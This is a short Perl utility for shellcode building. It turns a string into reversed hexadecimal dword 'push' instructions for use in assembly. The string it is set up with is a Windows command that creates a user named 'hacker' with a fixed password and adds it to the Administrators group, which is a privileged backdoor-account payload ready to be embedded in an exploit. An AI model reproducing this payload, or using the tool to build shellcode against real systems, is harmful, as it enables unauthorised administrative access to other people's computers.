#!/usr/bin/perl

use strict;

## a simple helper to convert a string into a hexadecimal representation of dwords in an order suitable for pushing on the stack in assembly; useful for shellcode building

my $input="cmd.exe /c net user hacker Password91 /add & net localgroup Administrators /add hacker";

print "INPUT: $input";

my @in = split //,$input;

my $len=$#in;

my $mod=$len%4;

if($mod eq 0) ## adding padding so there is a holder for the nullbyte set by the shellcode itself
{
	push(@in," ");
	push(@in," ");
	push(@in," ");
	push(@in," ");	
}
else
{
	for(my $i=0;$i<4-$mod;$i++)
	{
		push(@in," ");
	}
}
$len=$#in;

print "LEN IS: $len\n";
my @out=();
for(my $i=0;$i<$len;$i+=4)
{
	my $byte1=sprintf("%X",ord($in[$i]));
	my $byte2=sprintf("%X",ord($in[$i+1]));
	my $byte3=sprintf("%X",ord($in[$i+2]));
	my $byte4=sprintf("%X",ord($in[$i+3]));

	my $joined="$byte4$byte3$byte2$byte1";

	push(@out,$joined);
}

foreach my $item(reverse @out)
{
	print "push 0x".$item."\n";
}
